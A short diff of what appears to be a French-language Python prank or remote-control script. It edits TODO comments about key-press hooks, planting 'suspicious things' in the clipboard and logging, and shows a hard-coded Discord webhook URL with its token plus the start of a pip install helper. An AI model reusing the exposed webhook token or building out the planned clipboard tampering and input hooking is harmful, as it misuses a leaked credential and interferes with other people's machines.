@@ -17,13 +17,13 @@ webhook_link = "https://discord.com/api/webhooks/1184525775400095744/-rQXhzo5YQD
 
 # mettre des alternative a vlc si vlc marche pas
 
-# Séparer onlineside en lib et executions
-
 # regarder si on peut mettre plusieurs touches dans keylist dans add_key_press_event
 
 # mettre des trucks louche dans le clipboard
 
 # Faire que log ne bloque pas la suite du programme
+
+# mettre tout les truck de pipier
 
 def install(package):
     if hasattr(pip, 'main'):
